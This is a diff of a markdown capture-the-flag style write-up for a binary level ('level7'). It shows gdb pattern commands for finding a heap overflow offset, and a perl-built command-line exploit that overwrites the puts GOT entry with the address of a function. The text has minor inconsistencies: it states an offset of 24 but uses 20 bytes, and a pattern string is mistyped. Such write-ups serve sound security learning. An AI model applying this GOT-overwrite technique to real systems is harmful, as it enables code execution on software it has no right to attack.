@@ -58,6 +58,39 @@ arg[1]: 0xbffff88c ("BBBB")
 
 In this example, we see that if we send 30 A in the first argument, the second strcpy will try to write `"BBBB"` in address `0x41414141` -> "AAAA". Now we try to see the right offset.
 
+## Calculate the offset
+
+```bash
+pattern create 50
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+b *(&main+124)
+r 'AAA%AAsAABAA$AAnAACAA-(AAAADAA;AA)AAEAAaAA0AAFAAbA' bbbb
+```
+
+```
+[------------------------------------stack-------------------------------------]
+...
+0024| 0xbffff5d8 --> 0x804a028 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA")
+0028| 0xbffff5dc --> 0x804a008 --> 0x1
+[------------------------------------------------------------------------------]
+```
+
+`b[0]` -> `0x804a028`
+
+`b[1]` -> `0x804a02c`
+
+```bash
+x/s 0x804a02c
+0x804a02c:	 "A-AA(AADAA;AA)AAEAAaAA0AAFAAbA"
+```
+
+```
+AAA%AAsAABAA$AAnAACA A-AA(AADAA;A A)AAEAAaAA0AAFAAbA
+20 ------------------^
+```
+
+# Exploit
+
 The offset is 24. So we will write 20 A, then the address we want to change (`puts`) and for the second argument, the `m` address.
 ```bash
 > ./level7 "`perl -e 'print "A"x20 . "\x28\x99\x04\x08"'`" "`perl -e 'print "\xf4\x84\x04\x08"'`"
